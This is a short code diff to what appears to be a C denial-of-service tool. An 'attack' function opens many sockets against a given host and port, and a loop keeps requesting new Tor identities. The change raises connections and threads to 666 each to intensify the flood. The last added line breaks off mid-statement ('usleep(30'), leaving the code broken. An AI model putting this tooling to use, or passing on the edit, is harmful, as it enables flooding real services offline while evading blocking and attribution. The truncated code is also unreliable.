@@ -46,8 +46,8 @@ void broke(int s) {
 	// do nothing
 }
 
-#define CONNECTIONS 80
-#define THREADS 96
+#define CONNECTIONS 666
+#define THREADS 666
 int i;
 void attack(char *host, char *port, int id) {
 	int sockets[CONNECTIONS];
@@ -79,7 +79,7 @@ void cycle_identity() {
 	while(1) {
 		r=write(socket, "signal NEWNYM\n\x00", 16);
 		fprintf(stderr, "[%i: cycle_identity -> signal NEWNYM\n", r);
-		usleep(300000);
+		usleep(30
 	}
 }
 
